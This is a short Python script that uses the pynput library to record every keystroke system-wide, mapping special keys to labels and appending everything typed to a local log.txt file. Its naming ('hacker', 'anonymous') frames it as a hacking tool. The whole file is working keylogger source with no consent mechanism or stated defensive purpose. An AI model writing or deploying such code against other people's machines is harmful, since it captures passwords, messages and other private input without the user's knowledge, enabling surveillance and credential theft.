from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == 'Key.esc':
        raise SystemExit(0)
    if key == 'Key.enter':
        key = "\n"
    if key == 'Key.space':
        key = " "
    if key == 'Key.shift':
        key = " 'shift' "
    if key == 'Key.shift_r':
        key = " 'shif' "
    if key == 'Key.alt_l':
        key = " 'alt' "
    if key == 'Key.ctrl_l':
        key = " 'ctrl' "
    if key == 'Key.backspace':
        key = " 'xoa' "
    with open("log.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=anonymous) as hacker:
    hacker.join()